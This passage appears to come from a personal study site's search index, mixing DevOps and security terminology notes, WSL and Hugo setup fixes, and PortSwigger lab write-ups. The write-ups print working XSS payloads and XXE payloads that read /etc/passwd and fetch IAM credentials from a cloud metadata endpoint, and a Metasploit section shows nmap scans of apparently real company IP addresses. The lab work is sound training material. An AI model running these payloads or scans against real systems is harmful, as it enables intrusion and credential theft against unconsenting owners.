server的backend沒有辦法解析request URL的最後面出現/(例如==Abacus==)，舉例來說: /api/v1/about和/api/v1/about/在backend解析的時候是不一樣的，但明明wordlist上只出現/api/v1/about，會這樣是因為我給的Wfuzz testing URL是http://localhost:80FUZZ，Wfuzz會自動在後面補一個/，因此比較保險的方式是wordlist最一開始不要是/，然後Wfuzz testing URL是http://localhost:80/FUZZ這樣比較保險 :::\n"},{"id":503,"href":"/terminology/what-is-devops-mlops-ci_cd_/","title":"What is DevOps, MLOps, CI/CD?","section":"Terminologies","content":" 什麼是 DevOps？ :::spoiler DevOps 簡而言之，就是 Development + Operations ，也就是開發與維運。但大部分的文章都會說是「開發」「測試」「維運」三者的結合。如同下面這張圖想表示的意義一樣，當三者有了交集，即是 DevOps DevOps 想要達成的目標為何？ # 從 Patrick Debois 發現的問題與參考葉大一句話囊括 DevOps 的目標一文，可以了解，最大的目標即為速度。「天下武功，唯快不破」，從發現需求到產品上線的時間越短，能得到的回饋與市場也就越大；但快還不夠，還要好，也就是要有品質！如果只有快，而沒有品質，只是更快把 bug 上線，並破壞企業名聲而已。如何兼顧速度與品質，即為 DevOps 的主要目標。 DevOps 到底在做什麼？\n為何會出現 DevOps ，相信已經有個感覺了。那它究竟在做些什麼事呢？\n有文章會提到用 CALMS 的角度來說明 DevOps 的要領，這是下列五個英文單字的縮寫：\nCulture Automation Lean Measurement Sharing 這是了解 DevOps 概念的好方向之一。\n什麼是MLOps？-30 Days of MLOps :::spoiler 用最短的一句話來解釋它的話，MLOps 就是 Machine Learning 的 DevOps 在 Machine Learning 團隊中，除了資料科學家、資料工程師、DevOps 工程師作為固定班底外，協作單位還有產品經理、後端工程師等等。我們要讓所有人可以彼此良好的協作，這需要依賴更好的維運架構。除了最直覺想到的 Model 部署外，常見的挑戰還有例如：訓練 Model、測試與分析 Model、資料的預處理等等。 CI/CD是什麼？一篇認識CI/CD工具及優勢，將日常瑣事自動化 :::spoiler CI/CD工具也是為了此概念(DevOps)而產生的自動化工具，透過持續整合、持續部署的方式，在開發階段就自動協助開發人員偵測程式碼問題，並部署至伺服器\nCI（Continuous Integration）持續整合 # 持續整合（Continuous Integration，CI）顧名思義，就是當開發人員完成一個階段性的程式碼後就經由自動化工具測試、驗證，協助偵測程式碼問題，並建置出即將部署的版本（Build）\nCD（Continuous Deployment）持續部署 # 持續部署（Continuous Deployment）可以說是CI的下一階段，經過CI測試後所構建的程式碼可以透過CD工具部署至伺服器，減少人工部署的時間。\nCI/CD工具1：GitHub # GitHub是眾所皆知的Git Server網站，其CI/CD服務稱為GitHub Action，提供了多項控制API，能夠幫助開發者編排、掌握工作流程，在提交程式碼後自動編譯、測試並部署至伺服器，讓每位開發者都能受惠於平台本身自有的CI/CD功能。\nCI/CD工具2：GitLab # GitLab主要的服務是提供git版本控制系統，其CI/CD Pipeline功能簡單又實用，使用者只需要設定於專案根目錄下的「.gitlab-ci.yml」檔，便可以開始驅動各種Pipeline協助您完成自動化測試及部署。目前有提供GitLab CE（社群版）與 GitLab EE（企業版）兩種，使用者可以根據自己的需求選擇適合不同的方案。\nCI/CD工具3：Anthos # 由Google所推出的Anthos是一款能幫助企業迅速部署混合雲架構的跨雲管理平台。若是企業資源龐大且分佈於多雲環境，每一次的更新與維護都需要針對不同架構調整，將會大幅提升管理應用程式的負擔，而透過Anthos便可以將複雜的多雲環境以統一形式呈現，加速開發人員管理應用程式，一次完成多雲部署，建立更敏捷、高效的應用程式維運環境。\n"},{"id":504,"href":"/terminology/what-is-ids-ips-edr-mdr-nsm-siem_/","title":"What is IDS, IPS, EDR, MDR, NSM, SIEM?","section":"Terminologies","content":" IDS(Intrusion Detection System, 入侵偵測系統) 簡答: 從名字就可以看的出來，他是針對流入流出的各種封包的偵測系統，也就是獨立於Firewall的旁之，如果他有檢測到封包內有什麼異常的Payload或是pattern，就會跳出告警，但就僅只於此，不會再做更多的操作 詳答: What is IDS(Intrusion Detection Systems)? 入侵偵測系統（Intrusion Detection System，IDS）是用來偵測資訊系統或網路上潛在的惡意破壞活動\n網路型入侵偵測系統(NIDS):主要是由一個或多個偵測器，加上收集與分析資料的主控臺所組成，可以分析每個通過的網路封包，並與已知的攻擊特徵進行比對，如果符合某項攻擊特徵，系統就會啟動防護機制，例如發簡訊或命令防火牆中斷該連線。 主機型入侵偵測系統(HIDS):是從主機系統稽核日誌檔演進而來，必須在主機上安裝代理程式﹙Agent﹚，負責監視主機內部的程序，並監控記錄檔與可疑活動，若有任何系統事件都會被記錄至日誌檔，並與攻擊特徵資料庫比對，判斷主機是否遭到攻擊 誘捕型入侵偵測系統(Deception Systems):目的是偵測未經授權的活動，任何進出誘捕系統的封包都會被認定是可疑的。但它卻是受到爭議的產品，有些廠商認為誘捕型系統只適合學術研究，因為它誘導駭客上勾，因此收集的證據無法用來起訴駭客 IPS(Intrusion Prevention System, 入侵防禦系統) IPS就是要改進上述的問題，他主打的就是偵測到快快的東西就會主動的防禦掉，但這樣還是有一個問題，現今的攻擊手法越來越多種，而且有時候是那種可以包裝成安全落地的形式，必須要在本地端監控才有辦法知道 EDR(Endpoint Detection and Response, 端點偵測與應對) EDR就是在做這樣的事情，可是有可能會有一個疑問，每個人的主機內不是都有安裝那種傳統的Windows Defenders或是小紅傘那種東西，為什麼還需要有EDR，其實現今的攻擊手法已經有很大的變化，有可能單純看個人的裝置會看不出個所以然，必須要聯合其他的裝置一起做關聯性的比對才會知道目前是不是正在遭受攻擊，所以EDR強大的地方在於他做到各個裝置endpoint端點的串聯，讓資安事件的偵測和防禦可以更嚴謹，這也是中小型企業最需要的資安產品 MDR(Managed Detection and Response, 受管式偵測與應對) 這東西其實就是一個EDR+SOC的服務衍生的產品，但ddaa說這個東西要做出市場區隔可能還沒有到太創新 What is NSM(Network Security Monitors)? NSM主要目的是偵測、找出入侵者，提高能見度。它建立在「我們一定會被攻擊，而且最終防禦一定會被突破」的思惟上。假設意志堅決的駭客最終打穿我們辛苦建立的防禦，但只要能在入侵者進一步破壞、感染系統前偵測、做出回應，讓入侵者無法達到目的，便能阻擋這波攻擊 NSM不是等接收IDS/IPS等等資安設備觸發警示後才開始收集，而是平時便預先主動收集資料，提供NSM平台審視、分析，強化可見度，主動找出入侵軌跡\nWhat is SIEM(Security Information and Event Management) SIEM的功能和一般日誌管理工具類似，都會將來自不同伺服器和設備的日誌和事件紀錄集中在一個地方 (通常是Log server伺服器本身硬碟或特定的儲存池Storage pool)，避免日誌和紀錄隨著機器故障遺失，符合稽核要求，可以進行關鍵字或日期查詢，所以也有人直接用日誌管理工具來進行分析 功能\n彙整、解讀多項系統設備日誌 資料圖形化 SIEM具備強大的比對Correlation 功能 e.g.帳號登入失敗、創建新帳號、帳號權限提升等等可能是攻擊行為也可能是網管的正常登入，要看一連串的流量或封包資料才能判斷$\\to$耗費人力 整合其他資安工具或資安服務 "},{"id":505,"href":"/survey-papers/android-+-security/wight_-wired-ghost-touch-attack-on-capacitive-touchscreens/","title":"WIGHT: Wired Ghost Touch Attack on Capacitive Touchscreens","section":"Survey Papers","content":" WIGHT: Wired Ghost Touch Attack on Capacitive Touchscreens # tags: Meeting Paper NTU # :::info Jiang, Y., Ji, X., Wang, K., Yan, C., Mitev, R., Sadeghi, A. R., \u0026amp; Xu, W. (2022, May). Wight: Wired ghost touch attack on capacitive touchscreens. In 2022 IEEE Symposium on Security and Privacy (SP) (pp. 984-1001). IEEE. :::\nBackground # What is ghost touch?\nWhat is common-mode signal and differential-mode signal - 高中電子學_運算放大器_2. 運算放大器之特性與參數_2.3 運算放大器的動態特性參數 1_支裕文 Note: 這篇論文撇除早就忘記的電子學以外，其實應該很好理解\n"},{"id":506,"href":"/problem-solutions/wsl-tty-_dev_tty0/","title":"WSL tty /dev/tty0","section":"Problem Solutions","content":" WSL tty /dev/tty0 # Problem Description # 之前重灌電腦，重新載了WSL，但不知道為甚麼WSL沒有升到version 2，這會導致我在用gdb的時候(我是用gef)，想要設定redirect，但是看了別的視窗的tty都顯示/dev/tty1，而不是/dev/pts/1，導致無法如設定一樣可以分開視窗\nSolution # 先回答原因，這是因為目前的wsl version是1而不是2，所以只要把wsl version轉到2就可以了，具體做法可以參考這篇文章1\n確定wsl版本 $ wsl --list --verbose NAME STATE VERSION * Ubuntu-18.04 Stopped 1 docker-desktop Stopped 2 docker-desktop-data Stopped 2 Ubuntu-20.04 Running 1 Ubuntu-22.04 Stopped 1 可以看到目前所有版本都還是1 Switch 用管理員權限打開PowerShell $ Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform $ wsl --set-version Ubuntu-18.04 2 $ wsl --set-version Ubuntu-20.04 2 $ wsl --set-version Ubuntu-22.04 2 最後就可以開始設定gef config\nReference # [WSL] 將 WSL 升級成 WSL2 吧 !\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":507,"href":"/problem-solutions/wsl2-cannot-list-android-devices/","title":"WSL2 Cannot List Android Devices","section":"Problem Solutions","content":" WSL2 Cannot List Android Devices # 問題描述 # 這個問題的前題是Windows CMD以及WSL2都有正確安裝adb，但前者可以正常list出連接的device，後者卻為空\nHow to Solve # 這是參考StackOverflow - ADB device list empty using WSL2的說明，具體原理就是我們直接把Windows安裝adb的path，soft link給WSL2的path就可以了\n先找出Windows安裝adb的path 自行尋找 找出WSL2中adb的path 通常是/usr/bin/adb $ ll /usr/bin/adb lrwxrwxrwx 1 root root 45 Aug 14 12:07 /usr/bin/adb -\u0026gt; lrwxrwxrwx 1 root root 37 Jan 23 2022 /usr/bin/adb_bk -\u0026gt; ../lib/android-sdk/platform-tools/adb 備份原本的soft link $ sudo mv /usr/bin/adb /usr/bin/adb_bk 取代softlink $ sudo ln -sf /mnt/\u0026lt;folder path to adb\u0026gt;/adb.exe /usr/bin/adb 測試 $ adb devices * daemon not running; starting now at tcp:5037 * daemon started successfully List of devices attached RFCW81CY9AD device "},{"id":508,"href":"/security/practice/portswigger-web-security-academy/xss/xss---apprentice/","title":"XSS - APPRENTICE","section":"Securities","content":" XSS - APPRENTICE # tags: Portswigger Web Security Academy Web # [TOC]\nLab: Reflected XSS into HTML context with nothing encoded:zero: # Description: This lab contains a simple reflected cross-site scripting vulnerability in the search functionality. Goal: To solve the lab, perform a cross-site scripting attack that calls the alert function. Exp # Payload: \u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; :::spoiler Success Screenshot :::\nLab: Stored XSS into HTML context with nothing encoded # Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality. Goal: To solve this lab, submit a comment that calls the alert function when the blog post is viewed. Exp # You need to click into one post and comment something that contained script tag. Payload: \u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; :::spoiler Success Screenshot :::\nLab: DOM XSS in document.write sink using source location.search # Description: This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL. Goal: To solve this lab, perform a cross-site scripting attack that calls the alert function. Recon # Tried in random strings I tried everything I learned but nothing prompt appeared. But, I noticed something strange using view page source and inspect. Payload: \u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; You can see that the normal payload is not working, however, there has another place to inject script tag $\\to$ document.write(...) So, I inspect it in original page Exp # Payload: \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;\u0026quot; :::spoiler Success Screenshot :::\nLab: DOM XSS in innerHTML sink using source location.search # Description: This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search. Goal: To solve this lab, perform a cross-site scripting attack that calls the alert function. Recon # :::spoiler Source Code\n... \u0026lt;section class=blog-header\u0026gt; \u0026lt;h1\u0026gt;\u0026lt;span\u0026gt;0 search results for \u0026#39;\u0026lt;/span\u0026gt;\u0026lt;span id=\u0026#34;searchMessage\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;span\u0026gt;\u0026#39;\u0026lt;/span\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;script\u0026gt; function doSearchQuery(query) { document.getElementById(\u0026#39;searchMessage\u0026#39;).innerHTML = query; } var query = (new URLSearchParams(window.location.search)).get(\u0026#39;search\u0026#39;); if(query) { doSearchQuery(query); } \u0026lt;/script\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;/section\u0026gt; ... :::\nInput abc and observe page source Input \u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; and observe page source Nothing prompt appeared though it\u0026rsquo;s included in span tag\nSo, how about using img tag to achieve XSS?\nExp # Payload: \u0026lt;img src=1 onerror=alert(1)\u0026gt; It\u0026rsquo;s rendered successfully. :::spoiler Success Screenshot :::\nLab: DOM XSS in jQuery anchor href attribute sink using location.search source # Description: This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library\u0026rsquo;s $ selector function to find an anchor element, and changes its href attribute using data from location.search. Goal: To solve this lab, make the \u0026ldquo;back\u0026rdquo; link alert document.cookie. Recon # According to the description and our goal, we must find where back is. By using the string search of each page, I found it in feedback sub-page. :::spoiler Source code\n... \u0026lt;div class=\u0026#34;is-linkback\u0026#34;\u0026gt; \u0026lt;a id=\u0026#34;backLink\u0026#34;\u0026gt;Back\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; $(function() { $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;, (new URLSearchParams(window.location.search)).get(\u0026#39;returnPath\u0026#39;)); }); \u0026lt;/script\u0026gt; ... ::: According to the source code, we can inject some malicious path to replace /\nExp # Payload: /feedback?returnPath=javascript:alert(document.cookie); After you modified the URL, then you hit enter and click Back button down the page. Then it should be triggered. :::spoiler Result :::\nReference # PortSwigger Labs - DOM XSS in jQuery anchor href attribute sink using location.search source DOM XSS in jQuery anchor href attribute sink using \u0026hellip; (Video solution, Audio) :::spoiler DOM-based XSS\nIf a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery\u0026rsquo;s attr() function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the attr() function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element\u0026rsquo;s href attribute using data from the URL:\n$(function() { $(\u0026#39;#backLink\u0026#39;).attr(\u0026#34;href\u0026#34;,(new URLSearchParams(window.location.search)).get(\u0026#39;returnUrl\u0026#39;)); }); :::\nLab: Reflected XSS into a JavaScript string with angle brackets HTML encoded # Description: This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. Recon # We have to find where can inject XSS attack If we input abc in search box, there\u0026rsquo;re 2 place can be injected Then how about \u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; Seems it\u0026rsquo;s not working here. So, we should find another payload to inject.\nTry New payload Payload: 'abc $\\to$ Seems safe for ' character Payload: //abc $\\to$ Seems safe for // character Exp # Why we don\u0026rsquo;t inject into 2nd place? Payload: \\\\';alert(123);// or ';alert(123);// :::spoiler Success Screenshot :::\nLab: Stored XSS into anchor href attribute with double quotes HTML-encoded # Description: This lab contains a stored cross-site scripting vulnerability in the comment functionality. Goal: To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. Recon # Find the place to inject According to the description, we know that the comment place has a injection place. Comment: abc Name: aaa Email: a@gmail.com Website: https://test.sbkblog.online How about script tag input Comment: \u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; Seems not working here\nHow about inject into website place? Website: https://test.sbkblog.online\u0026quot;\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;// Still not working here\nAccording to Lab: DOM XSS in jQuery anchor href attribute sink using location.search source We know that we can inject XSS in href attribute by using the payload: javascript:alert(1)\nExp # Website Payload: javascript:alert(1) :::spoiler Success Screenshot :::\nLab: Reflected XSS into attribute with angle brackets HTML-encoded # Description: This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. Goal: To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. Recon # Find the place to inject Input: abc Seems we have 2 candidates\nHow about script tag Input: \u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt; Seems angle brackets are HTML-encoded and not working properly.\nHow about href attribute? Input: \u0026quot;javascript:alert(123) Still not working for input tag.\nExp - New payload # Input: \u0026quot; onmouseover=\u0026quot;alert(1) :::spoiler Success Screenshot :::\nLab: DOM XSS in jQuery selector sink using a hashchange event:four: # Description: This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery\u0026rsquo;s $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property. Goal: To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. Background - DOM XSS in jQuery # 簡單來說，有些頁面支援jQuery的location.hash功能，也就是在URL的末端添加#XXX，前端會自動scrolling到對應的位置(就是Github那樣)，文章中有提到如果hash是使用者可以控制的，攻擊者可以使用它來將 XSS 向量注入 $() seletor接收器。 較新版本的jQuery已通過阻止使用者在輸入以hash character(#)開頭時將 HTML 注入seletor來修補此特定漏洞。 Payload for example: \u0026lt;iframe src=\u0026quot;https://vulnerable-website.com#\u0026quot; onload=\u0026quot;this.src+='\u0026lt;img src=1 onerror=alert(1)\u0026gt;'\u0026quot;\u0026gt;\nRecon # Find the specific place to inject Follow the background reference to create the new payload\nExp - jQuery location.hash vulnerability # Payload: \u0026lt;iframe src=\u0026quot;https://0aab00ee04037bdb802cc6c600230039.web-security-academy.net/#\u0026quot; onload=\u0026quot;this.src+='\u0026lt;img src=xxx onerror=print()\u0026gt;'\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; :::spoiler Success Screenshot :::\nReference # Lab DOM XSS in jQuery Selector Sink Using a Hash Change Event\nReference # Burp Suite Security Academy Writeup\n"},{"id":509,"href":"/security/practice/portswigger-web-security-academy/xxe/xxe---apprentice/","title":"XXE - APPRENTICE","section":"Securities","content":" XXE - APPRENTICE # tags: Portswigger Web Security Academy Web # Description: This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input and returns any unexpected values in the response. Goal: To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file. Lab: Exploiting XXE using external entities to retrieve files # Recon # Use Burp Suite to intercept package You can notice that it use a normal xml format. Exp - Inject Directly # Exploit Payload:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt;]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u0026amp;xxe;\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt;\u0026lt;/stockCheck\u0026gt; :::spoiler Success Screenshot :::\nLab: Exploiting XXE to perform SSRF attacks # Description: This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input and returns any unexpected values in the response. The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive. Goal: To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server\u0026rsquo;s IAM secret access key from the EC2 metadata endpoint. Recon # Intercept Package From the screenshot of the package, we noticed that the xml attached data could be injected. Exp - Inject Directly # Exploit Payload:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\u0026#34;\u0026gt; ]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u0026amp;xxe;\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt;\u0026lt;/stockCheck\u0026gt; :::spoiler Success Screenshot :::\n"},{"id":510,"href":"/tools/ctf/%E5%88%A9%E7%94%A8metasploit-framework%E6%B8%AC%E8%A9%A6%E4%B8%80%E4%BA%9B%E7%B6%B2%E7%AB%99/","title":"利用Metasploit Framework測試一些網站","section":"Tools","content":" 利用Metasploit Framework測試一些網站 # [TOC]\nCheat Sheet # $ sudo msfdb init \u0026amp;\u0026amp; msfconsole msf6 \u0026gt; nmap -vv {IP} # e.g. nmap -vv 127.0.0.1 msf6 \u0026gt; search {http/ssh/ftp...關鍵字} # e.g. search rce msf6 \u0026gt; use {腳本位置} # e.g. use exploit/unix/http/cacti_filter_sqli_rce msf6 exploit(XXX) \u0026gt; show option # 顯示該腳本需要哪一些參數 msf6 exploit(XXX) \u0026gt; set {option name} {參數} # e.g. set RHOST 127.0.0.1 SmartDaily # IP: 34.81.5.101 Security Header Result\nnmap # :::spoiler nmap Result\nnmap -vv 34.81.5.101 [*] exec: nmap -vv 34.81.5.101 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 01:49 EDT Initiating Ping Scan at 01:49 Scanning 34.81.5.101 [2 ports] Completed Ping Scan at 01:49, 0.01s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 01:49 Completed Parallel DNS resolution of 1 host. at 01:49, 0.01s elapsed Initiating Connect Scan at 01:49 Scanning 101.5.81.34.bc.googleusercontent.com (34.81.5.101) [1000 ports] Discovered open port 443/tcp on 34.81.5.101 Discovered open port 80/tcp on 34.81.5.101 Increasing send delay for 34.81.5.101 from 0 to 5 due to 11 out of 14 dropped probes since last increase. Increasing send delay for 34.81.5.101 from 5 to 10 due to 11 out of 11 dropped probes since last increase. Increasing send delay for 34.81.5.101 from 10 to 20 due to 11 out of 11 dropped probes since last increase. Increasing send delay for 34.81.5.101 from 20 to 40 due to 11 out of 15 dropped probes since last increase. Completed Connect Scan at 01:50, 75.06s elapsed (1000 total ports) Nmap scan report for 101.5.81.34.bc.googleusercontent.com (34.81.5.101) Host is up, received syn-ack (0.0085s latency). Scanned at 2023-10-02 01:49:05 EDT for 75s Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE REASON 80/tcp open http syn-ack 443/tcp open https syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 75.09 seconds ::: 開的Port: 80/443\nNatureTEL # IP: 219.84.199.120 Security Header Result\nnmap # :::spoiler nmap Result\n$ nmap -vv 219.84.199.120 [*] exec: nmap -vv 219.84.199.120 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 01:53 EDT Initiating Ping Scan at 01:53 Scanning 219.84.199.120 [2 ports] Completed Ping Scan at 01:53, 0.01s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 01:53 Completed Parallel DNS resolution of 1 host. at 01:53, 0.01s elapsed Initiating Connect Scan at 01:53 Scanning so199-120.asiawhere.com (219.84.199.120) [1000 ports] Discovered open port 80/tcp on 219.84.199.120 Discovered open port 443/tcp on 219.84.199.120 Discovered open port 21/tcp on 219.84.199.120 Discovered open port 110/tcp on 219.84.199.120 Discovered open port 143/tcp on 219.84.199.120 Discovered open port 25/tcp on 219.84.199.120 Completed Connect Scan at 01:53, 4.63s elapsed (1000 total ports) Nmap scan report for so199-120.asiawhere.com (219.84.199.120) Host is up, received syn-ack (0.0091s latency). Scanned at 2023-10-02 01:53:07 EDT for 5s Not shown: 994 filtered tcp ports (no-response) PORT STATE SERVICE REASON 21/tcp open ftp syn-ack 25/tcp open smtp syn-ack 80/tcp open http syn-ack 110/tcp open pop3 syn-ack 143/tcp open imap syn-ack 443/tcp open https syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 4.67 seconds ::: 開的Port: 21/25/80/110/143/443\n飛像資訊 # IP: 199.15.163.148 Security Header Result\nnmap # :::spoiler nmap Result\n$ nmap -vv 199.15.163.148 [*] exec: nmap -vv 199.15.163.148 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-02 01:50 EDT Initiating Ping Scan at 01:50 Scanning 199.15.163.148 [2 ports] Completed Ping Scan at 01:50, 0.15s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 01:50 Completed Parallel DNS resolution of 1 host. at 01:50, 0.14s elapsed Initiating Connect Scan at 01:50 Scanning unalocated.163.wixsite.com (199.15.163.148) [1000 ports] Discovered open port 80/tcp on 199.15.163.148 Discovered open port 443/tcp on 199.15.163.148 Connect Scan Timing: About 18.15% done; ETC: 01:53 (0:02:20 remaining) Connect Scan Timing: About 21.00% done; ETC: 01:55 (0:03:49 remaining) Increasing send delay for 199.15.163.148 from 0 to 5 due to 11 out of 16 dropped probes since last increase. Connect Scan Timing: About 68.50% done; ETC: 01:52 (0:00:42 remaining) Completed Connect Scan at 01:52, 99.59s elapsed (1000 total ports) Nmap scan report for unalocated.163.wixsite.com (199.15.163.148) Host is up, received syn-ack (0.17s latency). Scanned at 2023-10-02 01:50:41 EDT for 99s Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE REASON 80/tcp open http syn-ack 443/tcp open https syn-ack Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 99.90 seconds ::: 開的Port: 80/443\n"},{"id":511,"href":"/problem-solutions/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8hugo+github%E6%9E%B6%E8%A8%AD%E7%B6%B2%E7%AB%99/","title":"如何使用Hugo+Github架設網站","section":"Problem Solutions","content":" 如何使用Hugo+Github架設網站 # 參考資料: 為了 SEO！我離開了 Medium，改在 GitHub 上自架個人網站\n註冊Github Account \u0026amp; Create Github Page # 參考資料: 使用 GitHub Pages 架設個人網站\n(Optional) # 參考資料: Github Pages 自訂網域教學\nHugo Step # 參考資料: 使用 Hugo 在 github 部署個人網站\n安裝Hugo(latest version) # 在Github Release可以找到符合自己需求的版本，目前我是選0.145.0_windows_amd64 解壓縮到C:\\hugo\\bin 設定環境變數，設定完後測試 $ hugo version hugo v0.145.0-666444f0a52132f9fec9f71cf25b441cc6a4f355 windows/amd64 BuildDate=2025-02-26T15:41:25Z VendorInfo=gohugoio Deploy Website on Local # Create New Site $ hugo new site demo Congratulations! Your new Hugo site was created in D:\\Life\\Website\\demo. Just a few more steps... 1. Change the current directory to D:\\Life\\Website\\demo. 2. Create or install a theme: - Create a new theme with the command \u0026#34;hugo new theme \u0026lt;THEMENAME\u0026gt;\u0026#34; - Or, install a theme from https://themes.gohugo.io/ 3. Edit hugo.toml, setting the \u0026#34;theme\u0026#34; property to the theme name. 4. Create new content with the command \u0026#34;hugo new content \u0026lt;SECTIONNAME\u0026gt;\\\u0026lt;FILENAME\u0026gt;.\u0026lt;FORMAT\u0026gt;\u0026#34;. 5. Start the embedded web server with the command \u0026#34;hugo server --buildDrafts\u0026#34;. See documentation at https://gohugo.io/. 選擇Hugo Theme並且更新toml File 到Hugo的Official Demo Theme看哪一個theme適合自己，假設我選擇relearn這個theme，就點選Download $ cd ./demo $ git submodule add https://github.com/McShelby/hugo-theme-relearn.git themes/relearn # 因為我是用relearn這個theme所以URL和folder name是customize # 也可以直接下載zip file，不過下面在設定toml file有一個地方要修改 $ echo theme = \u0026#39;relearn\u0026#39;\u0026gt;\u0026gt; hugo.toml # For CMD $ echo \u0026#34;theme = \u0026#39;relearn\u0026#39;\u0026#34; \u0026gt;\u0026gt; hugo.toml # For linux 這個toml檔案就是一個config file，所以描述網站的最基本資訊 新增一個測試的檔案 $ hugo new posts/hello.md $ cat ./content/posts/hello.md +++ date = \u0026#39;2025-04-02T19:15:29+08:00\u0026#39; draft = true title = \u0026#39;Hello\u0026#39; +++ hugo會在./demo/content/posts的地方新增一個hello.md這個檔案，並且把draft property改成false，最後deploy之後才會顯示 Deploy Local Server $ hugo server Watching for changes in D:\\Life\\Website\\demo\\{archetypes,assets,content,data,i18n,layouts,static,themes} Watching for config changes in D:\\Life\\Website\\demo\\hugo.toml, D:\\Life\\Website\\demo\\themes\\relearn\\hugo.toml Start building sites … hugo v0.145.0-666444f0a52132f9fec9f71cf25b441cc6a4f355 windows/amd64 BuildDate=2025-02-26T15:41:25Z VendorInfo=gohugoio | EN -------------------+----- Pages | 11 Paginator pages | 0 Non-page files | 0 Static files | 0 Processed images | 0 Aliases | 0 Cleaned | 0 Built in 163 ms Environment: \u0026#34;development\u0026#34; Serving pages from disk Running in Fast Render Mode. For full rebuilds on change: hugo server --disableFastRender Web Server is available at http://localhost:1313/ (bind address 127.0.0.1) Press Ctrl+C to stop 現在Local的deployment已經完成，剩下的就是deploy到Github Page 利用Github Action Deploy Hugo # 如果沒有碰過github action的人可能要先熟悉一下，這東西就是github的自動化流程，網路上有很多種action script，應該大同小異，我是用peaceiris/actions-gh-pages\n$ mkdir .github/workflows \u0026amp;\u0026amp; touch .github/workflows/gh-pages.yml name: GitHub Pages on: push: branches: - main # Set a branch name to trigger deployment pull_request: jobs: deploy: runs-on: ubuntu-22.04 permissions: contents: write concurrency: group: ${{ github.workflow }}-${{ github.ref }} steps: - uses: actions/checkout@v3 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#39;0.145.0\u0026#39; - name: Build run: hugo --minify working-directory: ./demo - name: Deploy uses: peaceiris/actions-gh-pages@v3 # If you\u0026#39;re changing the branch from main, # also change the `main` in `refs/heads/main` # below accordingly. if: github.ref == \u0026#39;refs/heads/main\u0026#39; with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./demo/public 